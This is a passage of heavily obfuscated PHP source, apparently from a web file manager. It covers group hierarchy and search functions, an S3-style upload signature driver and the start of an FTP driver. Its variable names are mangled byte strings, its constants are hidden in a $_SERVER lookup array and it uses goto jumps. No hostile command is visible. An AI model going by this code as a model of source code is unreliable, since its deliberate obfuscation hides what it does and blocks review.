$¼ñµŞè = $this->where(array($š†¸¨â½[182] => $ëšü‰ŒÉ))->_makeOrder()->selectPage(200); $this->_listDataApply($¼ñµŞè[$š†¸¨â½[415]]); return $¼ñµŞè; } public function listChildIds($Î°˜Ëæ©) { $ÜÙ«™È =& $_SERVER[Î‹ÃÂŞ„]; if (is_string($°±éÃ¹¢)) { $Î°˜Ëæ© = explode($ÜÙ«™È[50], $Î°˜Ëæ©); } $‘à…Æ´ = $this->where(array($ÜÙ«™È[1902] => array($ÜÙ«™È[7], $Î°˜Ëæ©)))->field($ÜÙ«™È[1994])->select(); if (!$‘à…Æ´) { return !1; } $ığõÓ = array(); foreach ($‘à…Æ´ as $İÌš™ª‘) { $ığõÓ[] = "\x73\x65\154\x65\143\x74\x20\x67\162\x6f\x75\x70\x49\104\x20\x66\x72\x6f\155\40\140\x67\x72\x6f\x75\160\x60\40\x77\x68\145\x72\x65\x20\160\x61\x72\145\x6e\x74\114\x65\166\x65\154\40\x6c\x69\153\x65\40\47{$İÌš™ª‘[$ÜÙ«™È[556]]}{$İÌš™ª‘[$ÜÙ«™È[1902]]}\x2c\x25\x27"; } $ığõÓ = implode($ÜÙ«™È[1995], $ığõÓ); $‘à…Æ´ = $this->query($ığõÓ); if (!$‘à…Æ´) { return array(); } $Î°˜Ëæ© = array_to_keyvalue($‘à…Æ´, $ÜÙ«™È[12], $ÜÙ«™È[1902]); return array_unique($Î°˜Ëæ©); } public function listByID($£šõ¡£) { $¹·Í—Ë =& $_SERVER[Î‹ÃÂŞ„]; if (!$£šõ¡£) { return array(); } $ûÜ²É– = array($¹·Í—Ë[1902] => array($¹·Í—Ë[7], $£šõ¡£)); $îÌ¥Û÷Ó = $this->where($ûÜ²É–)->select(); $îÌ¥Û÷Ó = array_sort_keep($îÌ¥Û÷Ó, $¹·Í—Ë[1902], $£šõ¡£); $this->_listDataApply($îÌ¥Û÷Ó); return $îÌ¥Û÷Ó; } public function listSearch($¢ÑÙõÁ) { $§ç‘ñ¾‡ =& $_SERVER[Î‹ÃÂŞ„]; $İÅ¥­âÉ = $¢ÑÙõÁ[$§ç‘ñ¾‡[1996]]; $ÆÀĞè×¤ = isset($¢ÑÙõÁ[$§ç‘ñ¾‡[1997]]) ? $¢ÑÙõÁ[$§ç‘ñ¾‡[1997]] : !1; if (!trim($İÅ¥­âÉ)) { return !1; } $İÅ¥­âÉ = str_replace($§ç‘ñ¾‡[1998], $§ç‘ñ¾‡[1999], $İÅ¥­âÉ); $ÆêÖÂ‡Î = array($§ç‘ñ¾‡[1902] => array($§ç‘ñ¾‡[429], "{$İÅ¥­âÉ}\x25"), $§ç‘ñ¾‡[32] => array($§ç‘ñ¾‡[429], "\45{$İÅ¥­âÉ}\45"), $§ç‘ñ¾‡[1055] => $§ç‘ñ¾‡[2000]); if ($ÆÀĞè×¤) { $…½æ¶‡ì = $this->getInfoSimple($ÆÀĞè×¤); $ı÷º‘Ëä = $…½æ¶‡ì[$§ç‘ñ¾‡[556]] . $ÆÀĞè×¤ . $§ç‘ñ¾‡[584]; $ÆêÖÂ‡Î = array($ÆêÖÂ‡Î, array($§ç‘ñ¾‡[556] => array($§ç‘ñ¾‡[429], $ı÷º‘Ëä))); } $ÆêÖÂ‡Î = $this->parseWhereLike($ÆêÖÂ‡Î); $õÆøï° = $this->_makeOrder()->where($ÆêÖÂ‡Î)->selectPage(20); $õÆøï° = $õÆøï° ? $õÆøï° : array($§ç‘ñ¾‡[415] => array(), $§ç‘ñ¾‡[412] => array()); if (!$õÆøï° || count($õÆøï°[$§ç‘ñ¾‡[415]]) < 5 && Input::check($İÅ¥­âÉ, $§ç‘ñ¾‡[364])) { $îÕøé = $this->groupChildrenAll($ÆÀĞè×¤); $š¸¸ŸŒ± = $this->_searchFromMeta($§ç‘ñ¾‡[507], $İÅ¥­âÉ, 10, $îÕøé); $áàô§ÁÂ = $this->_searchFromMeta($§ç‘ñ¾‡[508], $İÅ¥­âÉ, 10, $îÕøé); $Î¨õ…ŞÃ = array_merge($š¸¸ŸŒ±, $áàô§ÁÂ, $õÆøï°[$§ç‘ñ¾‡[415]]); $õÆøï°[$§ç‘ñ¾‡[415]] = array_unique_by_key($Î¨õ…ŞÃ, $§ç‘ñ¾‡[1902]); $õÆøï°[$§ç‘ñ¾‡[412]][$§ç‘ñ¾‡[413]] = count($õÆøï°[$§ç‘ñ¾‡[415]]); $õÆøï°[$§ç‘ñ¾‡[412]][$§ç‘ñ¾‡[414]] = ceil($õÆøï°[$§ç‘ñ¾‡[412]][$§ç‘ñ¾‡[413]] / $õÆøï°[$§ç‘ñ¾‡[412]][$§ç‘ñ¾‡[409]]); } $this->_listDataApply($õÆøï°[$§ç‘ñ¾‡[415]]); return $õÆøï°; } protected function groupChildrenAll($Ÿü·±üÎ) { $Ç¬æû–è =& $_SERVER[Î‹ÃÂŞ„]; if (!$Ÿü·±üÎ) { return !1; } if (!is_array($Ÿü·±üÎ)) { $Ÿü·±üÎ = array($Ÿü·±üÎ); } $ØíÁ€Àõ = $Ÿü·±üÎ; foreach ($Ÿü·±üÎ as $´ÍÌçÅ) { $õ¯«ç£ = $this->getInfoSimple($´ÍÌçÅ); $¿Ø‡İ«è = array($Ç¬æû–è[556] => array($Ç¬æû–è[429], $õ¯«ç£[$Ç¬æû–è[556]] . $´ÍÌçÅ . $Ç¬æû–è[584])); $ˆÄ•”–Ğ = $this->field($Ç¬æû–è[1902])->where($¿Ø‡İ«è)->select(); $ØíÁ€Àõ = array_merge($ØíÁ€Àõ, array_to_keyvalue($ˆÄ•”–Ğ, $Ç¬æû–è[12], $Ç¬æû–è[1902])); } return array_unique($ØíÁ€Àõ); } private function _searchFromMeta($½ŸÊáï÷, $ùÄéˆœß, $„µ’¥Ï‚, $–àÁÑ€ò) { $‹º¼™èş =& $_SERVER[Î‹ÃÂŞ„]; $ùÄéˆœß = strtolower($ùÄéˆœß); $Ê÷„âÏı = array($‹º¼™èş[96] => $½ŸÊáï÷, $‹º¼™èş[420] => array($‹º¼™èş[429], "\45{$ùÄéˆœß}\x25")); $Ê÷„âÏı = $this->parseWhereLike($Ê÷„âÏı); if ($–àÁÑ€ò) { $Ê÷„âÏı[$‹º¼™èş[1902]] = array($‹º¼™èş[7], $–àÁÑ€ò); } $³ºìô¸ = Model($‹º¼™èş[2001])->where($Ê÷„âÏı)->limit($„µ’¥Ï‚)->select(); if (!$³ºìô¸) { return array(); } $³ºìô¸ = array_to_keyvalue($³ºìô¸, $‹º¼™èş[12], $‹º¼™èş[1902]); $–ú¾·Ã = $this->where(array($‹º¼™èş[1990] => array($‹º¼™èş[7], $³ºìô¸)))->select(); if (!$–ú¾·Ã) { return array(); } return $–ú¾·Ã; } protected function _listDataApplyItem($…ääŞõ) { $ÖØÇ¿ÄÏ = array($…ääŞõ); $this->_listDataApply($ÖØÇ¿ÄÏ); return $ÖØÇ¿ÄÏ[0]; } protected function _listDataApply(&$Æ¹¡ÈËô) { $ÎöÍıİà =& $_SERVER[Î‹ÃÂŞ„]; if (!$Æ¹¡ÈËô) { return; } $ıŠú¯³ = array_to_keyvalue($Æ¹¡ÈËô, $ÎöÍıİà[12], $ÎöÍıİà[1902]); $this->_listAppendChildren($Æ¹¡ÈËô); $this->_listAppendChildrenMember($Æ¹¡ÈËô); $this->_listAppendMeta($Æ¹¡ÈËô, $ıŠú¯³); $this->_listAppendParent($Æ¹¡ÈËô); $this->_listAppendSourceRoot($Æ¹¡ÈËô, $ıŠú¯³); } private function _listAppendChildren(&$Ë˜±û“ó) { $Êâê’Á› =& $_SERVER[Î‹ÃÂŞ„]; $ïñœÒÎ = array_to_keyvalue($Ë˜±û“ó, $Êâê’Á›[12], $Êâê’Á›[1902]); $ÕŸş¹×» = array($Êâê’Á›[182] => array($Êâê’Á›[7], $ïñœÒÎ)); $œÛÜ¯ÂÛ = array($Êâê’Á›[182], $Êâê’Á›[2002] => $Êâê’Á›[536]); $ñ¹õ–íî = $this->field($œÛÜ¯ÂÛ)->where($ÕŸş¹×»)->group($Êâê’Á›[182])->select(); $›ÍÆ’İĞ = array_to_keyvalue($ñ¹õ–íî, $Êâê’Á›[182], $Êâê’Á›[536]); foreach ($Ë˜±û“ó as &$ôÏŸÑ¨˜) { $áïŸ¡–Ÿ = $ôÏŸÑ¨˜[$Êâê’Á›[1902]]; $ôÏŸÑ¨˜[$Êâê’Á›[2003]] = isset($›ÍÆ’İĞ[$áïŸ¡–Ÿ]) ? intval($›ÍÆ’İĞ[$áïŸ¡–Ÿ]) : !1; } unset($ôÏŸÑ¨˜); } private function _listAppendChildrenMember(&$ÜùÛ‡á­) { $õ­ş™‘˜ =& $_SERVER[Î‹ÃÂŞ„]; $«Ğ²‡²ù = array_to_keyvalue($ÜùÛ‡á­, $õ­ş™‘˜[12], $õ­ş™‘˜[1902]); $Øäü»Ğ = array($õ­ş™‘˜[1902] => array($õ­ş™‘˜[7], $«Ğ²‡²ù)); $ğ¿ºÏ™Ä = array($õ­ş™‘˜[1902], $õ­ş™‘˜[2002] => $õ­ş™‘˜[536]); $±úä–ôú = Model($õ­ş™‘˜[1992])->field($ğ¿ºÏ™Ä)->where($Øäü»Ğ)->group($õ­ş™‘˜[1902])->select(); $§×Œã×‹ = array_to_keyvalue($±úä–ôú, $õ­ş™‘˜[1902], $õ­ş™‘˜[536]); foreach ($ÜùÛ‡á­ as &$İ“©¥ÅÏ) { $­ÈÛğü¢ = $İ“©¥ÅÏ[$õ­ş™‘˜[1902]]; $İ“©¥ÅÏ[$õ­ş™‘˜[2004]] = isset($§×Œã×‹[$­ÈÛğü¢]) ? intval($§×Œã×‹[$­ÈÛğü¢]) : !1; } unset($İ“©¥ÅÏ); } private function _listAppendMeta(&$©–öí‹Ş, $éÏ‹¤†ò) { $½¢Õ±®à =& $_SERVER[Î‹ÃÂŞ„]; $ô¶–ù‹Ï = array($½¢Õ±®à[1902] => array($½¢Õ±®à[7], $éÏ‹¤†ò)); $ÆäÍÈá² = Model($½¢Õ±®à[1991])->where($ô¶–ù‹Ï)->select(); $ÆäÍÈá² = array_to_keyvalue_group($ÆäÍÈá², $½¢Õ±®à[1902]); foreach ($ÆäÍÈá² as &$ëãĞ˜ç£) { $ëãĞ˜ç£ = array_to_keyvalue($ëãĞ˜ç£, $½¢Õ±®à[96], $½¢Õ±®à[420]); } unset($ëãĞ˜ç£); foreach ($©–öí‹Ş as &$¤É”Á ) { $¤É”Á [$½¢Õ±®à[509]] = array(); if (isset($ÆäÍÈá²[$¤É”Á [$½¢Õ±®à[1902]]])) { $¤É”Á [$½¢Õ±®à[509]] = $ÆäÍÈá²[$¤É”Á [$½¢Õ±®à[1902]]]; } } unset($¤É”Á ); } protected function parentLevelArray($îÛÒãËí) { $ú¯¤ú¥ü =& $_SERVER[Î‹ÃÂŞ„]; $îÛÒãËí = explode($ú¯¤ú¥ü[50], trim($îÛÒãËí, $ú¯¤ú¥ü[50])); $îÛÒãËí = array_remove_value($îÛÒãËí, $ú¯¤ú¥ü[214]); return $îÛÒãËí; } protected function parentInGroup($Ô÷İË¶†, $°Ú´¶¨—) { $Ô³¾ÜÃ© =& $_SERVER[Î‹ÃÂŞ„]; $åºå†ËÖ = $this->getInfoSimple($Ô÷İË¶†); if (!$åºå†ËÖ) { return !0; } $»ÈÂñÕˆ = $this->parentLevelArray($åºå†ËÖ[$Ô³¾ÜÃ©[556]]); $»ÈÂñÕˆ[] = $Ô÷İË¶†; foreach ($»ÈÂñÕˆ as $Ô÷İË¶†) { if (in_array($Ô÷İË¶† . $Ô³¾ÜÃ©[12], $°Ú´¶¨—)) { return !0; } } return !1; } private function _listAppendParent(&$¥ÌÖ¢°é) { $‚Ğò‰‰İ =& $_SERVER[Î‹ÃÂŞ„]; $¤ø÷õ = array(); foreach ($¥ÌÖ¢°é as &$œ¿éÁ®) { $¤ø÷õ[$œ¿éÁ®[$‚Ğò‰‰İ[1902]]] = $œ¿éÁ®[$‚Ğò‰‰İ[32]]; $Û¹ôùÖ = $this->parentLevelArray($œ¿éÁ®[$‚Ğò‰‰İ[556]]); foreach ($Û¹ôùÖ as $„£Ë“Ì) { if (!isset($¤ø÷õ[$„£Ë“Ì])) { $¤ø÷õ[$„£Ë“Ì] = 0; } } } unset($œ¿éÁ®); foreach ($¤ø÷õ as $šÒõÀÚš => $·¡ŸÊ¥º) { if ($·¡ŸÊ¥º) { continue; } $´”ª½‹› = $this->getInfoSimple($šÒõÀÚš); $¤ø÷õ[$šÒõÀÚš] = $´”ª½‹›[$‚Ğò‰‰İ[32]]; } $ÔÚ‰›Ä³ = $GLOBALS[$‚Ğò‰‰İ[6]][$‚Ğò‰‰İ[91]][$‚Ğò‰‰İ[2005]]; if ($GLOBALS[$‚Ğò‰‰İ[539]] == $‚Ğò‰‰İ[90]) { $ÔÚ‰›Ä³ = !1; } foreach ($¥ÌÖ¢°é as &$œ¿éÁ®) { $Û¹ôùÖ = $this->parentLevelArray($œ¿éÁ®[$‚Ğò‰‰İ[556]]); $ ßÇ˜µ˜ = $‚Ğò‰‰İ[12]; foreach ($Û¹ôùÖ as $šÒõÀÚš => $„£Ë“Ì) { if ($ÔÚ‰›Ä³ && $šÒõÀÚš == 0) { continue; } $ ßÇ˜µ˜ .= $¤ø÷õ[$„£Ë“Ì] . $‚Ğò‰‰İ[8]; } if ($Û¹ôùÖ) { $ ßÇ˜µ˜ .= $œ¿éÁ®[$‚Ğò‰‰İ[32]]; } $œ¿éÁ®[$‚Ğò‰‰İ[561]] = str_replace($‚Ğò‰‰İ[564], $‚Ğò‰‰İ[8], $ ßÇ˜µ˜); } unset($œ¿éÁ®); } private function _listAppendSourceRoot(&$¶ÒÈÒÊÅ, $ëâ–«œ“) { $Ø›Á± è =& $_SERVER[Î‹ÃÂŞ„]; $¢ÛªãØ = Model($Ø›Á± è[872])->listSourceRoot(SourceModel::TYPE_GROUP, $ëâ–«œ“); $¢ÛªãØ = array_to_keyvalue($¢ÛªãØ, $Ø›Á± è[541]); $¢ÛªãØ = array_remove_key($¢ÛªãØ, $Ø›Á± è[541]); foreach ($¶ÒÈÒÊÅ as &$ Á³ŒµŠ) { $ Á³ŒµŠ[$Ø›Á± è[89]] = $¢ÛªãØ[$ Á³ŒµŠ[$Ø›Á± è[1902]]] ? $¢ÛªãØ[$ Á³ŒµŠ[$Ø›Á± è[1902]]] : array(); } unset($ Á³ŒµŠ); } protected function groupMerge($ŠÔÖßŞ) { $ŠÔÖßŞ = array_values(array_unique($ŠÔÖßŞ)); $åáÔÇıŠ = array(); for ($ŒÍ—ûÏ” = 0; $ŒÍ—ûÏ” < count($ŠÔÖßŞ); $ŒÍ—ûÏ”++) { $ê¥ûğ‹ã = !1; for ($”µ³ÒË¨ = 0; $”µ³ÒË¨ < count($ŠÔÖßŞ); $”µ³ÒË¨++) { if ($ŒÍ—ûÏ” == $”µ³ÒË¨) { continue; } if ($this->isParentOf($ŠÔÖßŞ[$”µ³ÒË¨], $ŠÔÖßŞ[$ŒÍ—ûÏ”])) { $ê¥ûğ‹ã = !0; break; } } if (!$ê¥ûğ‹ã) { $åáÔÇıŠ[] = $ŠÔÖßŞ[$ŒÍ—ûÏ”]; } } return $åáÔÇıŠ; } protected function isParentOf($åÙã¹Â, $ô…áëÎ‚) { $Ã×¯Ûåˆ =& $_SERVER[Î‹ÃÂŞ„]; if (!$åÙã¹Â || !$ô…áëÎ‚ || $åÙã¹Â == $ô…áëÎ‚) { return !1; } $‡Üú–øà = $this->getInfoSimple($åÙã¹Â); $ƒ»¶‹‡İ = $this->getInfoSimple($ô…áëÎ‚); $ËÖ§¿ä = $‡Üú–øà[$Ã×¯Ûåˆ[556]] . $åÙã¹Â . $Ã×¯Ûåˆ[50]; if (substr($ƒ»¶‹‡İ[$Ã×¯Ûåˆ[556]], 0, strlen($ËÖ§¿ä)) == $ËÖ§¿ä) { return !0; } return !1; } public function groupShowRoot($íÀ¦»õ, $Ñ‚Û¹ = false) { $åÛè±óª =& $_SERVER[Î‹ÃÂŞ„]; $˜Ñ“ë¸ = $this->getInfo($íÀ¦»õ); if (!$˜Ñ“ë¸) { return array(); } $¹…„Ë“è = $this->parentLevelArray($˜Ñ“ë¸[$åÛè±óª[556]]); $ü‘ÍñÜâ = array($íÀ¦»õ); if (count($¹…„Ë“è) == 0) { return $ü‘ÍñÜâ; } if ($Ñ‚Û¹ && count($¹…„Ë“è) == 1) { return $ü‘ÍñÜâ; } if (!$˜Ñ“ë¸[$åÛè±óª[509]] || !isset($˜Ñ“ë¸[$åÛè±óª[509]][$åÛè±óª[1988]]) || $˜Ñ“ë¸[$åÛè±óª[509]][$åÛè±óª[1988]] == $åÛè±óª[1957]) { return $this->groupShowRoot($¹…„Ë“è[count($¹…„Ë“è) - 1], $Ñ‚Û¹); } if ($˜Ñ“ë¸[$åÛè±óª[509]][$åÛè±óª[1988]] == $åÛè±óª[403]) { $”í¤ãí = explode($åÛè±óª[50], $˜Ñ“ë¸[$åÛè±óª[509]][$åÛè±óª[1989]]); if ($”í¤ãí) { $ü‘ÍñÜâ = array_merge($ü‘ÍñÜâ, $”í¤ãí); } } return $ü‘ÍñÜâ; } protected function resetParentLevel() { $€¬Ê‡ô =& $_SERVER[Î‹ÃÂŞ„]; $ıöí½¶É = $€¬Ê‡ô[1902]; $·¬ä¨œ = $this->select(); $·¬ä¨œ = array_to_keyvalue($·¬ä¨œ, $ıöí½¶É); foreach ($·¬ä¨œ as $©ÆÈ¡—) { $áâ×ëê = $©ÆÈ¡—; $øÛ·ãÓ = array(); while ($áâ×ëê[$€¬Ê‡ô[182]] != 0) { $øÛ·ãÓ[] = $áâ×ëê[$€¬Ê‡ô[182]]; $áâ×ëê = $·¬ä¨œ[$áâ×ëê[$€¬Ê‡ô[182]]]; } $øÛ·ãÓ[] = 0; $øÛ·ãÓ = $€¬Ê‡ô[50] . implode($€¬Ê‡ô[50], array_reverse($øÛ·ãÓ)) . $€¬Ê‡ô[50]; $this->setNamePinyin($©ÆÈ¡—[$ıöí½¶É], $©ÆÈ¡—[$€¬Ê‡ô[32]]); $this->where(array($ıöí½¶É => $©ÆÈ¡—[$ıöí½¶É]))->save(array($€¬Ê‡ô[623] => $øÛ·ãÓ)); } return $·¬ä¨œ; } public function groupNameAuto($Šìº©›, $Ğ·²…ü„) { $ğ¬Şª¯ =& $_SERVER[Î‹ÃÂŞ„]; $ìãÈÛÎ¢ = $this->where(array($ğ¬Şª¯[447] => $Šìº©›))->getField($ğ¬Şª¯[32], !0); if (!$ìãÈÛÎ¢ || !in_array($Ğ·²…ü„, $ìãÈÛÎ¢)) { return $Ğ·²…ü„; } for ($ÚÏ½Ó˜ = 1; $ÚÏ½Ó˜ <= count($ìãÈÛÎ¢) + 1; $ÚÏ½Ó˜++) { $ÈµãšØâ = $Ğ·²…ü„ . "\x28{$ÚÏ½Ó˜}\x29"; if (!in_array($ÈµãšØâ, $ìãÈÛÎ¢)) { return $ÈµãšØâ; } } } public function groupSwitch($Ÿô¹´¸¦, $¼ÅøŠ«ì) { $ÒÎè¹± =& $_SERVER[Î‹ÃÂŞ„]; $Åş›Ø = array($ÒÎè¹±[1902] => array($ÒÎè¹±[7], array($Ÿô¹´¸¦, $¼ÅøŠ«ì))); $Àöˆ¾¯ = $this->where($Åş›Ø)->select(); $Àöˆ¾¯ = array_to_keyvalue($Àöˆ¾¯, $ÒÎè¹±[1902]); if (!isset($Àöˆ¾¯[$Ÿô¹´¸¦]) || !isset($Àöˆ¾¯[$¼ÅøŠ«ì]) || $Àöˆ¾¯[$Ÿô¹´¸¦][$ÒÎè¹±[182]] == 0) { return !1; } $Åş›Ø = array($ÒÎè¹±[1902] => $Ÿô¹´¸¦); $õ³Õ¼£½ = Model($ÒÎè¹±[1992])->where($Åş›Ø)->select(); if (!$õ³Õ¼£½) { $õ³Õ¼£½ = array(); } foreach ($õ³Õ¼£½ as $’íäíİ) { $Í–¡Â²ş = $’íäíİ[$ÒÎè¹±[1704]]; $Åş›Ø = array($ÒÎè¹±[1704] => $Í–¡Â²ş, $ÒÎè¹±[1902] => $¼ÅøŠ«ì); $¹£·ËÍÚ = Model($ÒÎè¹±[1992])->where($Åş›Ø)->find(); if (!$¹£·ËÍÚ) { $˜„×‘ = array($¼ÅøŠ«ì => $’íäíİ[$ÒÎè¹±[2006]]); Model($ÒÎè¹±[570])->userGroupAdd($Í–¡Â²ş, $˜„×‘); } Model($ÒÎè¹±[570])->userGroupRemove($Í–¡Â²ş, $Ÿô¹´¸¦); } $Åş›Ø = array($ÒÎè¹±[180] => 2, $ÒÎè¹±[182] => 0, $ÒÎè¹±[455] => 1, $ÒÎè¹±[541] => array($ÒÎè¹±[7], array($Ÿô¹´¸¦, $¼ÅøŠ«ì))); $®—§¥ÈÔ = Model($ÒÎè¹±[872])->where($Åş›Ø)->field($ÒÎè¹±[2007])->select(); $®—§¥ÈÔ = array_to_keyvalue($®—§¥ÈÔ, $ÒÎè¹±[541], $ÒÎè¹±[183]); $ş²úî—÷ = !empty($®—§¥ÈÔ[$Ÿô¹´¸¦]) ? $®—§¥ÈÔ[$Ÿô¹´¸¦] : !1; if ($ş²úî—÷) { if (!$®—§¥ÈÔ[$¼ÅøŠ«ì]) { $®—§¥ÈÔ[$¼ÅøŠ«ì] = Model($ÒÎè¹±[872])->groupRootAdd($¼ÅøŠ«ì); } $£¨Ì¡ñÀ = $®—§¥ÈÔ[$¼ÅøŠ«ì]; $Åş›Ø = array($ÒÎè¹±[182] => $ş²úî—÷); $®—§¥ÈÔ = Model($ÒÎè¹±[872])->where($Åş›Ø)->field($ÒÎè¹±[2008])->select(); if (!$®—§¥ÈÔ) { $®—§¥ÈÔ = array(); } Model($ÒÎè¹±[872])->moveClearAuth = !1; foreach ($®—§¥ÈÔ as $‚¡¾¶˜) { $Äë“åßØ = $‚¡¾¶˜[$ÒÎè¹±[455]] == $ÒÎè¹±[90] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ÒÎè¹±[872])->move($‚¡¾¶˜[$ÒÎè¹±[183]], $£¨Ì¡ñÀ, $Äë“åßØ); } Model($ÒÎè¹±[872])->moveClearAuth = !0; $Åş›Ø = array($ÒÎè¹±[180] => 2, $ÒÎè¹±[541] => $Ÿô¹´¸¦); $ëÁŒŞ»¸ = array($ÒÎè¹±[541] => $¼ÅøŠ«ì); Model($ÒÎè¹±[2009])->where($Åş›Ø)->save($ëÁŒŞ»¸); Model($ÒÎè¹±[2010])->where($Åş›Ø)->save($ëÁŒŞ»¸); } $this->_changeChildLevel($Àöˆ¾¯[$Ÿô¹´¸¦], $Àöˆ¾¯[$¼ÅøŠ«ì], !0); $this->where(array($ÒÎè¹±[182] => $Ÿô¹´¸¦))->save(array($ÒÎè¹±[182] => $¼ÅøŠ«ì)); $this->_clearChildrenCache($Àöˆ¾¯[$¼ÅøŠ«ì]); return !0; } } goto c¡›ĞøĞ¼ ; D‰áò¾š¢Ë: class PathDriverEDS extends PathDriverMinIO { public function __construct($×ô÷üÑ‹) { parent::__construct($×ô÷üÑ‹); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($£Ñ¿óº®) { parent::__construct($£Ñ¿óº®); $this->signatureVersion($_SERVER[Î‹ÃÂŞ„][233]); } public function uploadFormData($ĞíËá¹¥, $÷¹¢À“ = 3600) { $Êû‘Äşû =& $_SERVER[Î‹ÃÂŞ„]; $—Î“²…˜ = $Êû‘Äşû[215]; $–¦ØÔÈÁ = $Êû‘Äşû[255]; $Ì°»ïë» = $Êû‘Äşû[62]; $Ğ•¯Ëª = gmdate($Êû‘Äşû[256]); $¯„®‡‡ = gmdate($Êû‘Äşû[257]); $ÈåÀî°ü = $Êû‘Äşû[258]; $¼õóã = $÷¹¢À“ . $Êû‘Äşû[12]; $›„­–ˆõ = $Êû‘Äşû[259]; $àÓ›Áî… = array($this->accessKey, $¯„®‡‡, $this->region, $Ì°»ïë», $ÈåÀî°ü); $Î…·ß ‰ = implode($Êû‘Äşû[8], $àÓ›Áî…); $áÛÁ™’² = array($Êû‘Äşû[260] => gmdate($Êû‘Äşû[1380], strtotime($Êû‘Äşû[262])), $Êû‘Äşû[263] => array(array($Êû‘Äşû[264] => $this->bucket), array($Êû‘Äşû[265] => $—Î“²…˜), array($Êû‘Äşû[266], $Êû‘Äşû[267], $Êû‘Äşû[12]), array($Êû‘Äşû[266], $Êû‘Äşû[268], $Êû‘Äşû[12]), array($Êû‘Äşû[266], $Êû‘Äşû[269], $Êû‘Äşû[12]), array($Êû‘Äşû[270] => $›„­–ˆõ), array($Êû‘Äşû[271] => $Î…·ß ‰), array($Êû‘Äşû[272] => $–¦ØÔÈÁ), array($Êû‘Äşû[273] => $Ğ•¯Ëª), array($Êû‘Äşû[274] => $¼õóã))); $Ÿùç°¯í = base64_encode(json_encode($áÛÁ™’²)); $ú¶‡à‚… = hash_hmac($Êû‘Äşû[275], $¯„®‡‡, $Êû‘Äşû[276] . $this->secret, !0); $ú÷‚ƒèË = hash_hmac($Êû‘Äşû[275], $this->region, $ú¶‡à‚…, !0); $Òä¤—ŸÉ = hash_hmac($Êû‘Äşû[275], $Ì°»ïë», $ú÷‚ƒèË, !0); $ï±¬¬«÷ = hash_hmac($Êû‘Äşû[275], $ÈåÀî°ü, $Òä¤—ŸÉ, !0); $ûúª™ = hash_hmac($Êû‘Äşû[275], $Ÿùç°¯í, $ï±¬¬«÷); $÷ÛÊ•À‰ = array($Êû‘Äşû[232] => $Êû‘Äşû[12], $Êû‘Äşû[277] => $Êû‘Äşû[12], $Êû‘Äşû[265] => $—Î“²…˜, $Êû‘Äşû[270] => $›„­–ˆõ, $Êû‘Äşû[278] => $Ÿùç°¯í, $Êû‘Äşû[279] => $Î…·ß ‰, $Êû‘Äşû[280] => $–¦ØÔÈÁ, $Êû‘Äşû[281] => $Ğ•¯Ëª, $Êû‘Äşû[282] => $¼õóã, $Êû‘Äşû[283] => $ûúª™, $Êû‘Äşû[198] => $this->getHost()); return $÷ÛÊ•À‰; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($µ¨âƒ´) { parent::__construct(); if (count($µ¨âƒ´) > 0) { $this->_init($µ¨âƒ´); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Â™°) { $ÜÑ¢ßÄÑ =& $_SERVER[Î‹ÃÂŞ„]; global $config; $this->appCharset = $config[$ÜÑ¢ßÄÑ[1407]]; $this->systemCharset = $config[$ÜÑ¢ßÄÑ[1408]]; if (isset($Â™°[$ÜÑ¢ßÄÑ[1409]]) && $Â™°[$ÜÑ¢ßÄÑ[1409]]) { $this->systemCharset = $Â™°[$ÜÑ¢ßÄÑ[1409]]; } } public function iconvApp($úÛó·¿Ô) { return $this->iconvTo($úÛó·¿Ô, $this->systemCharset, $this->appCharset); } public function iconvSystem($“†À”«£) { return $this->iconvTo($“†À”«£, $this->appCharset, $this->systemCharset); } public function getPathOuter($Ë²²ºËÜ) { $…Ãû•’ˆ =& $_SERVER[Î‹ÃÂŞ„]; $¥×¼Ÿ”© = $this->iconvApp($this->pathBase); $Ë²²ºËÜ = $this->iconvApp($Ë²²ºËÜ); if (substr($¥×¼Ÿ”©, 0, 2) == $…Ãû•’ˆ[1410]) { $¥×¼Ÿ”© = BASIC_PATH . substr($¥×¼Ÿ”©, 2); } if (substr($Ë²²ºËÜ, 0, 2) == $…Ãû•’ˆ[1410]) { $Ë²²ºËÜ = BASIC_PATH . substr($Ë²²ºËÜ, 2); } $¥×¼Ÿ”© = KodIO::clear($¥×¼Ÿ”©); $Ë²²ºËÜ = KodIO::clear($Ë²²ºËÜ); $Ë²²ºËÜ = substr($Ë²²ºËÜ, strlen($¥×¼Ÿ”©)); if (empty($this->pathDriver)) { return $Ë²²ºËÜ; } return $this->pathDriver . $…Ãû•’ˆ[8] . ltrim($Ë²²ºËÜ, $…Ãû•’ˆ[8]); } private function _init($Í‘¾Æ’° = array()) { $ûÚØ³§ç =& $_SERVER[Î‹ÃÂŞ„]; if (!function_exists($ûÚØ³§ç[1411])) { throw new Exception(LNG($ûÚØ³§ç[1412])); } $this->config = $Í‘¾Æ’°; $this->charsetReset($Í‘¾Æ’°); foreach ($Í‘¾Æ’° as $­÷ÄÒï => $£ëË¸â‡) { if (isset($this->{$­÷ÄÒï})) { $this->{$­÷ÄÒï} = $£ëË¸â‡; } } return $this->_login($Í‘¾Æ’°); } private function _login($ûùá®ë¬) { $¢ìœŞìû =& $_SERVER[Î‹ÃÂŞ„]; static $¸¸ùóİÓ = array(); $¾õ»—½¡ = md5(json_encode($ûùá®ë¬)); if (isset($¸¸ùóİÓ[$¾õ»—½¡])) { foreach ($¸¸ùóİÓ[$¾õ»—½¡] as $òºÍ¸°­ => $“úâ´÷) { $this->{$òºÍ¸°­} = $“úâ´÷; } return !0; } $ëÉºĞÚĞ = parse_url(trim($this->server, $¢ìœŞìû[8])); $this->host = $ëÉºĞÚĞ[$¢ìœŞìû[198]]; $Â¾ÃóÆ¸ = isset($ëÉºĞÚĞ[$¢ìœŞìû[197]]) && $ëÉºĞÚĞ[$¢ìœŞìû[197]] == $¢ìœŞìû[1413] ? !0 : !1; $this->scheme = $Â¾ÃóÆ¸ ? $¢ìœŞìû[1414] : $¢ìœŞìû[1415]; $this->port = isset($ëÉºĞÚĞ[$¢ìœŞìû[199]]) ? $ëÉºĞÚĞ[$¢ìœŞìû[199]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $İ´èûıè = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, 